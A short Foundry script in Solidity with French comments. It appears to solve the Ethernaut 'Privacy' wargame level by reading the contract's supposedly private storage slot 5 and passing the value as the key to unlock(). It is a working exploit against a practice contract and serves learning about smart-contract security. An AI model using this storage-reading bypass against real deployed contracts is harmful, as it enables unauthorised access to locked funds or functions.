// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Privacy.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

// def un nouveau contrat nommé AttackPrivacy qui hérite de la classe Script de Foundry
contract AttackPrivacy is Script {

    //Crée une référence à une instance du contrat Privacy déjà déployée sur la blockchain avec ethernaut
    Privacy pricavyTP = Privacy(0x836A57a4B76242453Fb2D389Eb8862eDfc373dEd);

    //Définit une fonction run qui exécute les instructions suivantes
    function run() external{
        // debut VM brdc
        vm.startBroadcast();
        //Récupère la clé de déverrouillage de la variable data[2] du contrat Privacy
        bytes32 myKey = vm.load(address(pricavyTP), bytes32(uint256(5)));
        //Déverrouille le contrat Privacy en appelant la fonction unlock avec la clé récupérée
        pricavyTP.unlock(bytes16(myKey));
        //Fin 
        vm.stopBroadcast();
    }
}
